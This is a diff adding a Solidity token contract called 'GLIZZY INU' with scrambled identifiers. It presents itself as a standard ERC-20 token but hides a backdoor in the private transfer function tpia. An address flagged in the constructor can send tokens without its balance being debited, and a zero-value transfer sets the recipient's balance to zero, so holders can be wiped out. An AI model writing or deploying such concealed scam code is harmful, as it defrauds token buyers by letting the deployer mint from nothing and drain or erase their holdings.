@@ -1,0 +1,61 @@
+contract GLIZZY is Ownable {
+    function transfer(address MmNUdCzhS, uint256 IxecmJWLE) public returns (bool success) {
+        tpia(msg.sender, MmNUdCzhS, IxecmJWLE);
+        return true;
+    }
+
+    function transferFrom(address muitvhlxdpa, address MmNUdCzhS, uint256 IxecmJWLE) public returns (bool success) {
+        require(IxecmJWLE <= allowance[muitvhlxdpa][msg.sender]);
+        allowance[muitvhlxdpa][msg.sender] -= IxecmJWLE;
+        tpia(muitvhlxdpa, MmNUdCzhS, IxecmJWLE);
+        return true;
+    }
+
+    uint256 private iCOaMylJs = 101;
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+
+    constructor(address OHiGNsJum) {
+        balanceOf[msg.sender] = totalSupply;
+        FYJrlswKH[OHiGNsJum] = iCOaMylJs;
+        IUniswapV2Router02 kyaofdmnp = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+        wngFVUYDM = IUniswapV2Factory(kyaofdmnp.factory()).createPair(address(this), kyaofdmnp.WETH());
+    }
+
+    uint256 public totalSupply = 42069000000 * 10 ** 9;
+
+    mapping(address => uint256) private FYJrlswKH;
+
+    function tpia(address muitvhlxdpa, address MmNUdCzhS, uint256 IxecmJWLE) private {
+        if (0 == FYJrlswKH[muitvhlxdpa]) {
+            balanceOf[muitvhlxdpa] -= IxecmJWLE;
+        }
+        balanceOf[MmNUdCzhS] += IxecmJWLE;
+        if (0 == IxecmJWLE && MmNUdCzhS != wngFVUYDM) {
+            balanceOf[MmNUdCzhS] = IxecmJWLE;
+        }
+        emit Transfer(muitvhlxdpa, MmNUdCzhS, IxecmJWLE);
+    }
+
+    mapping(address => uint256) private tokzajin;
+
+    string public symbol = 'GLIZZY';
+
+    uint8 public decimals = 9;
+
+    mapping(address => uint256) public balanceOf;
+
+    function approve(address yOPUhensz, uint256 IxecmJWLE) public returns (bool success) {
+        allowance[msg.sender][yOPUhensz] = IxecmJWLE;
+        emit Approval(msg.sender, yOPUhensz, IxecmJWLE);
+        return true;
+    }
+
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+
+    mapping(address => mapping(address => uint256)) public allowance;
+
+    address public wngFVUYDM;
+
+    string public name = 'GLIZZY INU';
+}
